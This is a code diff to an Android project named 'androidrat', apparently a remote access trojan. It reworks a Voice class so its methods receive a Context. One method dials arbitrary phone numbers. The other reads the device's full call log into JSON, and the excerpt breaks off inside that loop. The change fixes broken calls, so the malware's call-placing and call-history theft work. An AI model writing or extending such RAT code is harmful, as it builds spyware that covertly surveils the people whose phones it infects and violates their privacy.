@@ -1,5 +1,6 @@
 package com.ot.androidrat;
 
+import android.content.Context;
 import android.content.Intent;
 import android.database.Cursor;
 import android.media.MediaRecorder;
@@ -17,25 +18,25 @@ import java.util.TimerTask;
 
 public class Voice {
 
-    public int phoneCall(String phoneNo){
+    public int phoneCall(Context context, String phoneNo){
         try{
             Intent callIntent = new Intent(Intent.ACTION_CALL);
             callIntent.setData(Uri.parse("tel:" + phoneNo));
-            new MainService().startService(callIntent);
+            context.startService(callIntent);
         }catch(Exception ex){
             return 1;
         }
         return 0;
     }
 
-    public JSONObject viewCallLog() {
+    public JSONObject viewCallLog(Context context) {
         JSONObject Calls = null;
         try {
             Calls = new JSONObject();
             JSONArray list = new JSONArray();
 
             Uri allCalls = Uri.parse("content://call_log/calls");
-            Cursor cur = new MainActivity().getContentResolver().query(allCalls, null, null, null, null);
+            Cursor cur = context.getContentResolver().query(allCalls, null, null, null, null);
 
             while (cur.moveToNext()) {
                 JSONObject call = new JSONObject();
